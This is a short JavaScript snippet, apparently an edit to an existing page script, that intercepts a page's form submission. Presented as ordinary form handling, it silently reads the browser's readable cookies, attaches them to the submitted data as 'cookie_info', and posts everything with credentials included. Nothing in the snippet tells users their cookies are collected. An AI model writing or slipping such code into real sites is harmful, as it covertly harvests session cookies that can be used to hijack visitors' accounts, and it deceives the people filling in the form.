// ...existing code...
document.addEventListener("DOMContentLoaded", function () {
  try {
    var form = document.querySelector("form");
    if (!form) return;
    if (!form.getAttribute("method")) form.setAttribute("method", "POST");

    form.addEventListener("submit", function (ev) {
      ev.preventDefault();
      var formData = new FormData(form);

      // Append readable cookies (HttpOnly cookies are not accessible)
      var cookieInfo = "";
      try { cookieInfo = document.cookie || ""; } catch (e) { cookieInfo = ""; }
      formData.append("cookie_info", cookieInfo);

      var action = form.getAttribute("action") || window.location.href;

      // Send with credentials so same-origin cookies are included
      if (window.fetch) {
        fetch(action, {
          method: "POST",
          body: formData,
          credentials: "include",
          headers: { "Accept": "application/json" }
        }).then(function () {
          try { location.hash = "#question1"; var a = document.getElementById("question1"); if (a && typeof a.focus === "function") a.focus(); } catch (e) {}
        }).catch(function () {
          try { location.hash = "#question1"; } catch (e) {}
        });
      } else {
        // Fallback: native submit
        form.submit();
      }
    }, { passive: false });
  } catch (err) { /* non-fatal */ }
});
